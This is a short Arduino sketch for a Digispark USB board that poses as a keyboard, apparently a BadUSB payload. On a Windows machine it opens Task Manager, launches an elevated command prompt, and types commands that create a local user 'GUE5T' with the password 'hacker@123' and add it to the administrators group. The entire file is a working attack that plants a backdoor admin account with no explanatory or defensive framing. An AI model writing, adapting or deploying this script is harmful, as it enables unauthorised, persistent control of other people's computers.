
#include "DigiKeyboard.h"
#define KEY_TAB 0x2b

void setup()
{
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskmgr");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_N);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("net user GUE5T hacker@123 /add");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("net localgroup administradores GUE5T /add");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("exit");
   }
void loop() {}
